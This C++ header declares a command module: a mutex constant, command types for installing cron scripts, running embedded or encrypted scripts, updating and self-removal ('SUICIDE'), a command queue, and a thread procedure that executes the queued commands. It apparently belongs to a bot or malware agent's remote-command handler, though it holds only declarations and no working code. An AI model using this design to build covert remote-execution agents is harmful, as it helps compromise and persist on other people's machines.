#pragma once

#define MUTEX_COMMANDMODULE 0x507310

namespace CommandModule
{
	enum COMMAND_TYPE
	{
		INSTALL_SCRIPT = 0,
		INSTALL_CRON_SCRIPT = 1,
		RUN_EMBED_SCRIPT = 2,
		ADD_CRON_SCRIPT = 3,
		RUN_SCRIPT = 4,
		RUN_CRYPTED_SCRIPT = 5,

		UPDATE = 99,
		SUICIDE = 66,
	};

	typedef struct
	{
		COMMAND_TYPE type;
		char * parameters;
		long parametersSize;
	}command_t;

	typedef struct command_list
	{	
		command_t command;
		command_list * next;
	}command_list_t;

	void init(void);
	void uninit(void);
	void addCommand(COMMAND_TYPE type, char * parameters, long parametersLength);
	void executeCommand(command_t const& command);
	DWORD WINAPI _procExecuteCommands(void * p);
};